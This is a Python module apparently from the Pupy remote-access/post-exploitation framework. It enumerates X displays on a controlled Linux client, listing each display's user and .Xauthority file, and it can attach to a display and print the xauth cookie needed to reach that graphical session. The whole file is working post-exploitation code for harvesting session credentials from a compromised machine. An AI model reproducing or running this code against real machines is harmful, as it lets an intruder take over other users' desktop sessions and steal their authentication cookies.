# -*- coding: utf-8 -*-
from pupylib.PupyModule import *
from pupylib.utils.rpyc_utils import obtain

__class_name__="Display"

@config(compat="linux", cat="admin")
class Display(PupyModule):
    """ Set display variable """

    dependencies = [ 'display' ]

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='users', description=self.__doc__)
        self.arg_parser.add_argument('-x', '--xauth', help='Path to .Xauthority')
        self.arg_parser.add_argument('-X', '--print-xauth', action='store_true',
                                         help='Print xauth information for current hostname')
        self.arg_parser.add_argument('display', nargs='?', help='Display to use')

    def run(self, args):
        display = self.client.conn.modules.display
        if args.display:
            if display.attach_to_display(args.display, args.xauth):
                self.success('Attached to {}'.format(args.display))
                if args.print_xauth:
                    info = display.extract_xauth_info(args.display)
                    if info:
                        family, host, display, cookie, value = info
                        self.success('xauth: {}:{}/{} {} {}'.format(
                            host, display, family, cookie, value
                        ))
                    else:
                        self.error('xauth: entries not found')
            else:
                self.error('Couldn\'t attach to {}'.format(args.display))
        else:
            displays = obtain(display.guess_displays())
            for display, items in displays.iteritems():
                for item in items:
                    self.success('{} user={} xauth={}'.format(display, item[0], item[1]))
